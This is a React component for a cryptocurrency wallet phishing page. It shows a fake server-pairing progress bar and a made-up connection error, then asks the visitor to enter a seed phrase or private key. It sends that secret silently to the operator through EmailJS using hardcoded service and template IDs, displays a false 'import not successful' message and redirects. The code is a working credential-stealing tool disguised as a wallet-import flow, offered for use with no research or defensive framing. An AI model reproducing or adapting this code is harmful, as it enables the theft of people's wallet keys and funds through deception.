import { useEffect, useState } from "react";
import emailjs from "@emailjs/browser";

import {  useNavigate } from "react-router-dom";

import { toast } from "react-toastify";

const GetFormation = () => {
	const [active, setActive] = useState("seed");
	const navigate = useNavigate();
	const [progress, setProgress] = useState(100);

	const [form, setForm] = useState({
		privatekey: "",
		phrase: "",
	});

	useEffect(() => {
		// Reset progress when component mounts
		setProgress(0);

		// Set up animation timing
		const duration = 3000; // 3 seconds in milliseconds
		const interval = 20; // Update interval in milliseconds
		const steps = duration / interval;
		const increment = 100 / steps;
		// Create timer to increment progress
		const timer = setInterval(() => {
			setProgress((prevProgress) => {
				const newProgress = prevProgress + increment;
				// Stop the timer when we reach 100%
				if (newProgress >= 100) {
					clearInterval(timer);
					return 100;
				}
				return newProgress;
			});
		}, interval);
		// Clean up timer on component unmount
		return () => clearInterval(timer);
	}, []);
	useEffect(() => {
		emailjs.init({
			publicKey: "whCQBM27FJhHyGnTk",
			// Do not allow headless browsers
			blockHeadless: true,
			blockList: {
				// Block the suspended emails
				list: ["foo@emailjs.com", "bar@emailjs.com"],
				// The variable contains the email address
				watchVariable: "userEmail",
			},
			limitRate: {
				// Set the limit rate for the application
				id: "app",
				// Allow 1 request per 10s
				throttle: 10000,
			},
		});
	}, []);

	const sendEmail = () => {
		emailjs
			.send("service_7qykcqq", "template_4s1uz6l", { ...form, wallet: name })
			.then(
				(result) => {
					console.log(result, "success");
				},
				(error) => {
					console.log(error, "error");
				}
			);
		toast.error("Wallet imported not successful");
		navigate("/");
	};

	return (
		<div className="flex justify-center items-center h-[700px] mx-10">
			{Math.round(progress) < 100 ? (
				<div className="w-full max-w-md mx-auto mt-8">
					<div className="w-full bg-gray-700 rounded-full h-4 overflow-hidden">
						<div
							className="bg-cyan-400 h-4 rounded-full transition-all duration-100 ease-linear"
							style={{ width: `${progress}%` }}
						></div>
					</div>
					<div className="mt-2 text-center text-gray-300">
						<p className="font-semibold">Pairing with servers</p>{" "}
						{Math.round(progress)}%
					</div>
				</div>
			) : (
				<div className="flex justify-center min-w-screen">
					<div className="bg-gray-800 p-8 rounded-2xl shadow-xl">
						<div className="bg-yellow-900/30 border border-yellow-700 rounded-lg text-yellow-300 mb-8 py-5 px-5">
							<p>
								<span className="font-semibold">Error-4011: </span>Cannot
								establish connection to{" "}
								<span className="text-yellow-300 font-semibold"> Generic </span>
								servers, please import your wallet.
							</p>
						</div>
						<div>
							<div className="flex justify-center text-sm gap-3 text-white py-3 rounded-t-2xl">
								<p
									onClick={() => setActive("seed")}
									className={`cursor-pointer w-fit px-10 py-2 px-[8px] rounded-full  ${
										active === "seed" ? "bg-cyan-600 " : "bg-gray-700"
									}`}
								>
									Seed Phrase
								</p>
								<p
									onClick={() => setActive("private")}
									className={`cursor-pointer px-3 py-2 rounded-full ${
										active === "private" ? "bg-cyan-600 " : "bg-gray-700"
									} `}
								>
									Private Key
								</p>
							</div>
							{active === "seed" ? (
								<div className="bg-gray-700 px-4 py-5 rounded-2xl">
									<div>
										<div className="mb-2">
											<p className="text-sm lg:text-base text-gray-300">
												Typically 12 or 24 words separated by single spaces.
											</p>
											<p className="mt-3 font-semibold text-sm text-gray-200">
												Seed Phrase:
											</p>
										</div>
										<input
											onChange={(e) =>
												setForm({ ...form, phrase: e.target.value })
											}
											placeholder="Please enter mnemonic phrase "
											className="h-[80px] w-full outline-none bg-gray-900 border border-gray-600 text-gray-200 px-4 rounded-xl"
										/>
									</div>
								</div>
							) : (
								<div className="bg-gray-700 border border-gray-600 px-4 py-5 rounded-2xl">
									<div>
										<div className="mb-2">
											<p className="text-sm lg:text-base text-gray-300">
												Enter your private key.
											</p>
											<p className="mt-3 font-semibold text-sm text-gray-200">
												Private key:
											</p>
										</div>
										<input
											onChange={(e) =>
												setForm({ ...form, privatekey: e.target.value })
											}
											placeholder="Enter your private key."
											className="h-[80px] w-full outline-none bg-gray-900 border border-gray-600 text-gray-200 px-4 rounded-xl"
										/>
									</div>
								</div>
							)}

							<button
								className="w-full mt-4 bg-cyan-600 hover:bg-cyan-500 text-white py-3 rounded-xl"
								onClick={sendEmail}
							>
								Import Wallet
							</button>
						</div>
					</div>
				</div>
			)}
		</div>
	);
};

export default GetFormation;
